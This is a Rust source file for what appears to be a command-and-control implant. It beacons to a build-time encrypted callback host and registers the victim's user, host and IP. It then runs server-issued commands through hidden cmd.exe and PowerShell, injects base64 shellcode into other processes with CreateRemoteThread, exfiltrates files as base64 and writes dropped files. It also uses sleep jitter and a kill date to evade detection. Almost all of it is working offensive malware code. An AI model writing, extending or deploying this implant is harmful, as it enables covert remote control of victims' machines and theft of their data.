use link_common::{
    build_client, decrypt_config, derive_key, CallbackRequest, RegisterRequest, TaskResponse,
};
use std::env;
use std::net::UdpSocket;
use std::process::Command;

const CALLBACK: &str = env!("CALLBACK");

// ── System info ──────────────────────────────────────────────────────────────

fn username() -> String {
    env::var("USERNAME")
        .or_else(|_| env::var("USER"))
        .unwrap_or_else(|_| "unknown".into())
}

fn hostname() -> String {
    env::var("COMPUTERNAME")
        .or_else(|_| env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown".into())
}

fn local_ip() -> String {
    UdpSocket::bind("0.0.0.0:0")
        .ok()
        .and_then(|s| s.connect("8.8.8.8:80").ok().map(|_| s))
        .and_then(|s| s.local_addr().ok())
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|| "unknown".into())
}

// ── Sleep configuration ───────────────────────────────────────────────────────

static mut SLEEP_SECONDS: u64 = 5;
static mut JITTER_PERCENT: u32 = 0;

fn get_sleep_seconds() -> u64 {
    unsafe { SLEEP_SECONDS }
}

fn get_jitter_percent() -> u32 {
    unsafe { JITTER_PERCENT }
}

fn set_sleep_seconds(seconds: u64) {
    unsafe {
        SLEEP_SECONDS = seconds;
    }
}

fn set_jitter_percent(percent: u32) {
    unsafe {
        JITTER_PERCENT = percent.min(100);
    }
}

// ── Kill date configuration ────────────────────────────────────────────────

static mut KILL_DATE: Option<i64> = None; // Timestamp in seconds since UNIX_EPOCH

fn get_kill_date() -> Option<i64> {
    unsafe { KILL_DATE }
}

fn set_kill_date(timestamp: Option<i64>) {
    unsafe {
        KILL_DATE = timestamp;
    }
}

fn should_exit() -> bool {
    if let Some(kill_date) = get_kill_date() {
        if let Ok(now) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
            if now.as_secs() as i64 > kill_date {
                return true;
            }
        }
    }
    false
}

// ── Main C2 loop ─────────────────────────────────────────────────────────────

pub fn link_loop() {
    // Decrypt the callback address
    let encryption_key = derive_key("linky-secret-key", "callback-salt");
    let decrypted_callback =
        decrypt_config(CALLBACK, &encryption_key).unwrap_or_else(|| CALLBACK.to_string());

    let client = build_client();
    let base = format!("https://{}", decrypted_callback);

    // Stage 1: establish session cookie
    loop {
        if client.get(format!("{}/js", base)).send().is_ok() {
            break;
        }
        // Check if we should exit due to kill date
        if should_exit() {
            return;
        }

        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
    }

    // Stage 2: register
    let reg = RegisterRequest {
        link_username: username(),
        link_hostname: hostname(),
        internal_ip: local_ip(),
        external_ip: String::new(),
        platform: "windows".into(),
        pid: std::process::id(),
    };

    let mut x_req_id = loop {
        if let Ok(r) = client
            .post(format!("{}/static/register", base))
            .json(&reg)
            .send()
        {
            if let Ok(t) = r.json::<TaskResponse>() {
                break t.x_request_id;
            }
        }
        sleep(5);
    };

    // Stage 3: polling loop
    let mut prev_output = String::new();
    let mut prev_task_id = String::new();

    loop {
        let cb = CallbackRequest {
            q: &prev_output,
            tasking: &prev_task_id,
        };

        match client
            .post(format!("{}/static/get", base))
            .header("x-request-id", &x_req_id)
            .json(&cb)
            .send()
            .and_then(|r| r.json::<TaskResponse>())
        {
            Ok(task) => {
                x_req_id = task.x_request_id.clone();
                if task.q.is_empty() {
                    prev_output = String::new();
                    prev_task_id = String::new();
                } else if task.q == "exit" {
                    break;
                } else {
                    prev_output = dispatch(&task.q);
                    prev_task_id = task.tasking.clone();
                }
            }
            Err(_) => {
                prev_output = String::new();
                prev_task_id = String::new();
            }
        }

        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
    }
}

// ── Command dispatch ─────────────────────────────────────────────────────────

fn dispatch(raw: &str) -> String {
    let (cmd, args) = split_first(raw);
    match cmd {
        "cd" => env::set_current_dir(args)
            .map(|_| String::new())
            .unwrap_or_else(|e| format!("[-] {}", e)),

        "pwd" => env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|e| format!("[-] {}", e)),

        "ls" => list_dir(if args.is_empty() { "." } else { args }),

        "pid" => std::process::id().to_string(),

        "whoami" => format!("{}\\{}", hostname(), username()),

        "info" => collect_system_info(),
        "ps" => list_processes(),
        "netstat" => list_network_connections(),
        "sleep" => handle_sleep_command(args),
        "killdate" => handle_killdate_command(args),

        "integrity" => integrity_level(),

        "inject" => inject_cmd(args),
        "download" => download_file(args),
        "upload" => upload_file(args),

        // cmd /C … wrapper sent by the server
        _ if raw.starts_with("cmd /C ") || raw.starts_with("cmd.exe /C ") => {
            let inner = raw
                .trim_start_matches("cmd /C ")
                .trim_start_matches("cmd.exe /C ");
            shell_exec("cmd.exe", &["/C", inner])
        }

        // powershell wrapper
        _ if raw.starts_with("powershell") => {
            shell_exec("powershell.exe", &["-noP", "-sta", "-w", "1", "-c", args])
        }

        // fallback: send through cmd.exe
        _ => shell_exec("cmd.exe", &["/C", raw]),
    }
}

/// Run a subprocess, suppressing the console window on Windows.
fn shell_exec(prog: &str, args: &[&str]) -> String {
    let mut cmd = Command::new(prog);
    cmd.args(args);

    // CREATE_NO_WINDOW (0x08000000) – Windows-only extension trait
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x0800_0000);
    }

    match cmd.output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() {
                out.push_str(&err);
            }
            out
        }
        Err(e) => format!("[-] {}", e),
    }
}

fn list_dir(path: &str) -> String {
    match std::fs::read_dir(path) {
        Ok(entries) => entries
            .flatten()
            .map(|e| {
                let name = e.file_name().to_string_lossy().into_owned();
                if e.file_type().map(|t| t.is_dir()).unwrap_or(false) {
                    format!("<DIR>  {}", name)
                } else {
                    format!("       {}", name)
                }
            })
            .collect::<Vec<_>>()
            .join("\n"),
        Err(e) => format!("[-] {}", e),
    }
}

// ── Token integrity level (Windows only) ────────────────────────────────────

#[cfg(target_os = "windows")]
fn integrity_level() -> String {
    use windows::{Win32::Foundation::*, Win32::Security::*, Win32::System::Threading::*};

    const LOW: u32 = 0x1000;
    const MEDIUM: u32 = 0x2000;
    const HIGH: u32 = 0x3000;
    const SYSTEM: u32 = 0x4000;

    unsafe {
        let mut token = HANDLE::default();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token).is_err() {
            return "unknown".into();
        }

        // First call: get required buffer size
        let mut size: u32 = 0;
        let _ = GetTokenInformation(token, TokenIntegrityLevel, None, 0, &mut size);
        let mut buf = vec![0u8; size as usize];

        if GetTokenInformation(
            token,
            TokenIntegrityLevel,
            Some(buf.as_mut_ptr().cast()),
            size,
            &mut size,
        )
        .is_err()
        {
            let _ = CloseHandle(token);
            return "unknown".into();
        }
        let _ = CloseHandle(token);

        // Interpret the buffer as TOKEN_MANDATORY_LABEL
        let label = &*(buf.as_ptr() as *const TOKEN_MANDATORY_LABEL);
        let sid = label.Label.Sid;
        let count = *GetSidSubAuthorityCount(sid) as isize;
        // SubAuthority is declared as [DWORD; 1] but is a variable-length tail
        let rid = *GetSidSubAuthority(sid, count as u32 - 1);

        match rid {
            r if r < LOW => "Untrusted",
            r if r < MEDIUM => "Low",
            r if r < HIGH => "Medium",
            r if r < SYSTEM => "High",
            _ => "System",
        }
        .to_string()
    }
}

#[cfg(not(target_os = "windows"))]
fn integrity_level() -> String {
    "N/A".into()
}

// ── Process injection (Windows only) ────────────────────────────────────────

fn inject_cmd(args: &str) -> String {
    let (pid_str, b64) = split_first(args);
    if b64.is_empty() {
        return "Usage: inject <pid> <base64_shellcode>".into();
    }
    let pid: u32 = match pid_str.parse() {
        Ok(p) => p,
        Err(_) => return "Usage: inject <pid> <base64_shellcode>".into(),
    };
    use base64::{engine::general_purpose, Engine};
    match general_purpose::STANDARD.decode(b64) {
        Ok(sc) => inject_shellcode(pid, &sc),
        Err(e) => format!("[-] base64 decode: {}", e),
    }
}

#[cfg(target_os = "windows")]
fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
    use winapi::um::memoryapi::WriteProcessMemory;
    use windows::{Win32::Foundation::*, Win32::System::Memory::*, Win32::System::Threading::*};

    unsafe {
        let proc = match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
            Ok(handle) => handle,
            Err(_) => return format!("[-] OpenProcess({}) failed", pid),
        };
        if proc.is_invalid() {
            return format!("[-] OpenProcess({}) failed", pid);
        }

        let addr = VirtualAllocEx(
            proc,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            let _ = CloseHandle(proc);
            return "[-] VirtualAllocEx failed".into();
        }

        let mut written = 0usize;
        let _ = WriteProcessMemory(
            proc.0 as *mut winapi::ctypes::c_void,
            addr as *mut winapi::ctypes::c_void,
            shellcode.as_ptr() as *const winapi::ctypes::c_void,
            shellcode.len(),
            &mut written,
        );

        let mut old = PAGE_PROTECTION_FLAGS(0);
        let _ = VirtualProtectEx(proc, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);

        let thr = match CreateRemoteThread(
            proc,
            None,
            0,
            Some(std::mem::transmute(addr)),
            None,
            0,
            None,
        ) {
            Ok(handle) => handle,
            Err(_) => {
                let _ = CloseHandle(proc);
                return "[-] CreateRemoteThread failed".into();
            }
        };
        if thr.is_invalid() {
            let _ = CloseHandle(proc);
            return "[-] CreateRemoteThread failed".into();
        }

        let _ = CloseHandle(thr);
        let _ = CloseHandle(proc);
        format!("[+] Injected {} bytes into PID {}", shellcode.len(), pid)
    }
}

#[cfg(not(target_os = "windows"))]
fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
    format!(
        "[-] Process injection only available on Windows (pid={}, sc_len={})",
        pid,
        shellcode.len()
    )
}

fn download_file(path: &str) -> String {
    use std::fs;
    use std::io::Read;

    if path.is_empty() {
        return "[-] Usage: download <file_path>".to_string();
    }

    match fs::File::open(path) {
        Ok(mut file) => {
            let mut buffer = Vec::new();
            if let Err(e) = file.read_to_end(&mut buffer) {
                return format!("[-] Failed to read file: {}", e);
            }

            // Encode file content in base64
            use base64::{engine::general_purpose::STANDARD, Engine};
            let encoded = STANDARD.encode(&buffer);
            format!("FILE:{}:{}", path, encoded)
        }
        Err(e) => format!("[-] Failed to open file: {}", e),
    }
}

fn upload_file(args: &str) -> String {
    use std::fs;
    use std::io::Write;

    if args.is_empty() {
        return "[-] Usage: upload <base64_content> <destination_path>".to_string();
    }

    // Parse the arguments (content and path are separated by space)
    let parts: Vec<&str> = args.splitn(2, ' ').collect();
    if parts.len() < 2 {
        return "[-] Invalid upload command format".to_string();
    }

    let content = parts[0];
    let path = parts[1];

    // Decode base64 content
    use base64::{engine::general_purpose::STANDARD, Engine};
    let decoded = match STANDARD.decode(content) {
        Ok(data) => data,
        Err(e) => return format!("[-] Failed to decode base64: {}", e),
    };

    // Write file
    match fs::File::create(path) {
        Ok(mut file) => {
            if let Err(e) = file.write_all(&decoded) {
                format!("[-] Failed to write file: {}", e)
            } else {
                format!("[+] File uploaded successfully: {}", path)
            }
        }
        Err(e) => format!("[-] Failed to create file: {}", e),
    }
}

fn collect_system_info() -> String {
    use std::time::SystemTime;

    let mut info = Vec::new();

    // OS version
    info.push(format!("OS Version: {}", env::consts::OS));

    // Architecture
    info.push(format!("Architecture: {}", env::consts::ARCH));

    // Current user and hostname
    info.push(format!("User: {}\\{}", hostname(), username()));

    // Network interfaces - simplified for Windows
    info.push("Network: Multiple interfaces (use ipconfig for details)".to_string());

    // Memory info - simplified
    info.push("RAM: Use Task Manager for detailed memory info".to_string());

    // CPU info
    info.push(format!("CPU Cores: {}", num_cpus::get()));

    // Uptime - simplified
    if let Ok(uptime) = SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
        let hours = uptime.as_secs() / 3600;
        let minutes = (uptime.as_secs() % 3600) / 60;
        info.push(format!("Uptime: {}h {}m", hours, minutes));
    }

    // Current process info
    info.push(format!("Process ID: {}", std::process::id()));

    // Current working directory
    if let Ok(cwd) = std::env::current_dir() {
        info.push(format!("Working Directory: {}", cwd.display()));
    }

    // Environment variables count
    info.push(format!(
        "Environment Variables: {}",
        std::env::vars().count()
    ));

    info.join("\n")
}

fn list_processes() -> String {
    use std::process::Command;

    // On Windows, we'll use tasklist command for simplicity
    // In a real implementation, you would use Windows API
    let output = match Command::new("tasklist")
        .arg("/FO")
        .arg("CSV")
        .arg("/NH")
        .output()
    {
        Ok(output) => output,
        Err(e) => return format!("[-] Failed to execute tasklist: {}", e),
    };

    if !output.status.success() {
        return "[-] tasklist command failed".to_string();
    }

    let output_str = String::from_utf8_lossy(&output.stdout);
    format!(
        "PID\tPPID\tUSER\t\tCOMMAND\n{}",
        output_str.replace(",", "\t")
    )
}

fn list_network_connections() -> String {
    use std::process::Command;

    // On Windows, we'll use netstat command for simplicity
    // In a real implementation, you would use Windows API
    let output = match Command::new("netstat").arg("-ano").output() {
        Ok(output) => output,
        Err(e) => return format!("[-] Failed to execute netstat: {}", e),
    };

    if !output.status.success() {
        return "[-] netstat command failed".to_string();
    }

    String::from_utf8_lossy(&output.stdout).into_owned()
}

// ── Encrypted configuration ────────────────────────────────────────────────

// ── Helpers ──────────────────────────────────────────────────────────────────

fn split_first(s: &str) -> (&str, &str) {
    s.find(' ')
        .map(|i| (&s[..i], s[i + 1..].trim_start()))
        .unwrap_or((s, ""))
}

fn sleep(secs: u64) {
    std::thread::sleep(std::time::Duration::from_secs(secs));
}

fn sleep_with_jitter(base_seconds: u64, jitter_percent: u32) {
    use rand::Rng;

    if jitter_percent == 0 {
        // No jitter, just sleep the base time
        sleep(base_seconds);
    } else {
        // Calculate jitter range (±jitter_percent%)
        let jitter_range = (base_seconds as f64 * jitter_percent as f64 / 100.0) as i64;
        let mut rng = rand::thread_rng();
        let jitter = rng.gen_range(-jitter_range..=jitter_range);

        // Ensure we don't sleep for negative time
        let sleep_time = if jitter.is_negative() {
            base_seconds.saturating_sub(jitter.unsigned_abs())
        } else {
            base_seconds.saturating_add(jitter as u64)
        };

        // Sleep for at least 1 second
        let final_sleep = sleep_time.max(1);
        sleep(final_sleep);
    }
}

fn handle_sleep_command(args: &str) -> String {
    if args.is_empty() {
        return format!(
            "Current sleep: {} seconds, jitter: {}%",
            get_sleep_seconds(),
            get_jitter_percent()
        );
    }

    // Parse arguments
    let parts: Vec<&str> = args.split_whitespace().collect();

    if !parts.is_empty() {
        if let Ok(new_sleep) = parts[0].parse::<u64>() {
            set_sleep_seconds(new_sleep);

            if parts.len() > 1 {
                if let Ok(new_jitter) = parts[1].parse::<u32>() {
                    set_jitter_percent(new_jitter);
                    return format!(
                        "[+] Sleep updated: {} seconds, jitter: {}%",
                        get_sleep_seconds(),
                        get_jitter_percent()
                    );
                }
            }

            return format!("[+] Sleep updated: {} seconds", get_sleep_seconds());
        }
    }

    "[-] Usage: sleep <seconds> [jitter_percent]".to_string()
}

fn handle_killdate_command(args: &str) -> String {
    if args.is_empty() {
        match get_kill_date() {
            Some(timestamp) => {
                // Convert timestamp to readable date
                if let Some(date_time) = chrono::DateTime::from_timestamp(timestamp, 0) {
                    format!(
                        "Current kill date: {}",
                        date_time.format("%Y-%m-%d %H:%M:%S")
                    )
                } else {
                    format!("Current kill date: {} (invalid timestamp)", timestamp)
                }
            }
            None => "No kill date set".to_string(),
        }
    } else if args.to_lowercase() == "clear" {
        set_kill_date(None);
        "[+] Kill date cleared".to_string()
    } else {
        // Parse date in format YYYY-MM-DD or timestamp
        if let Ok(timestamp) = args.parse::<i64>() {
            set_kill_date(Some(timestamp));
            if let Some(date_time) = chrono::DateTime::from_timestamp(timestamp, 0) {
                format!(
                    "[+] Kill date set to: {}",
                    date_time.format("%Y-%m-%d %H:%M:%S")
                )
            } else {
                format!("[+] Kill date set to timestamp: {}", timestamp)
            }
        } else {
            // Try to parse as date string
            let formats = [
                "%Y-%m-%d",
                "%Y-%m-%d %H:%M:%S",
                "%Y/%m/%d",
                "%Y/%m/%d %H:%M:%S",
            ];
            for format in formats {
                if let Ok(parsed_date) = chrono::NaiveDateTime::parse_from_str(args, format) {
                    let timestamp = parsed_date.and_utc().timestamp();
                    set_kill_date(Some(timestamp));
                    return format!(
                        "[+] Kill date set to: {}",
                        parsed_date.format("%Y-%m-%d %H:%M:%S")
                    );
                }
            }
            "[-] Usage: killdate [timestamp|YYYY-MM-DD|clear]".to_string()
        }
    }
}
